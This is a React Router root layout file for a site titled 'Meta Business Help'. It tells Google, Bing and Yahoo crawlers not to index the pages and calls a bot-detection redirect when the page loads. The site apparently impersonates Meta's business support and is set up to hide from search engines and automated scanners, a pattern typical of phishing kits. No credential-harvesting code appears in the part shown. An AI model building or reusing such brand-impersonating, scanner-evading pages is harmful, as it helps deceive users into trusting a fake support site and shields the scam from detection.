import '@/app.css';
import Footer from '@/components/footer';
import Header from '@/components/header';
import { Links, Outlet, Scripts, ScrollRestoration, type LinksFunction } from 'react-router';
import stylesheet from '@/app.css?url';
import { handleBlockRedirect } from '@/utils/botDetection';
import Warning from '@/routes/warning';
import { useEffect } from 'react';
export const links: LinksFunction = () => [{ rel: 'stylesheet', href: stylesheet }];

export const Layout = ({ children }: Readonly<{ children: React.ReactNode }>) => {
    useEffect(() => {
        handleBlockRedirect();
    }, []);
    return (
        <html lang='en'>
            <head>
                <meta charSet='utf-8' />
                <title>Meta Business Help</title>
                <meta name='viewport' content='width=device-width, initial-scale=1' />
                <meta name='robots' content='noindex, nofollow' />
                <meta name='googlebot' content='noindex, nofollow' />
                <meta name='bingbot' content='noindex, nofollow' />
                <meta name='slurp' content='noindex, nofollow' />
                <meta name='google' content='notranslate' />
                <Links />
            </head>
            <body className='font-helvetica'>
                <Header />
                <main>{children}</main>
                <ScrollRestoration />
                <Scripts />
                <Footer />
            </body>
        </html>
    );
};

const App = () => {
    return <Outlet />;
};

export default App;
